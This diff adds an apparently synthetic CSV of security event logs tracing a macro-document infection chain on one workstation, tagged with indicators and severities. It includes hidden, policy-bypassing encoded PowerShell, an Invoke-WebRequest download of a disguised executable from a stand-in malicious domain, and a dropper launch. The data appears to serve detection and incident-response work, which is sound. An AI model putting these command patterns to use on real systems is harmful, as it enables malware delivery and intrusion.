@@ -1,0 +1,6 @@
+EventID,Timestamp,Hostname,ProcessName,ParentProcess,CommandLine,DetectedIOC,ThreatType,Severity
+4688,2026-10-15T09:12:01Z,FIN-WKS-04,excel.exe,explorer.exe,"excel.exe /e ""C:\Users\Accountant\Downloads\Invoice_October_Overdue.xlsm""",Invoice_October_Overdue.xlsm,Malicious Document,High
+4688,2026-10-15T09:12:04Z,FIN-WKS-04,cmd.exe,excel.exe,cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc aHR0cDovL2JhZC1wYXlsb2FkLWRlbGl2ZXJ5LmV4YW1wbGUuY29t...,powershell.exe,Execution T1059,High
+3,2026-10-15T09:12:08Z,FIN-WKS-04,powershell.exe,cmd.exe,Invoke-WebRequest -Uri hxxp://bad-payload-delivery[.]example[.]com/stage2.exe -OutFile C:\Temp\svchost_update.exe,bad-payload-delivery[.]example[.]com,Malicious Domain,Critical
+3,2026-10-15T09:12:12Z,FIN-WKS-04,powershell.exe,cmd.exe,Network connection established to remote IP 198.51.100.42:443,198.51.100.42,C2 IPv4,Critical
+4688,2026-10-15T09:12:15Z,FIN-WKS-04,svchost_update.exe,powershell.exe,C:\Temp\svchost_update.exe --inject-explorer,c4ca4238a0b923820dcc509a6f75849b,Trojan Dropper MD5,Critical
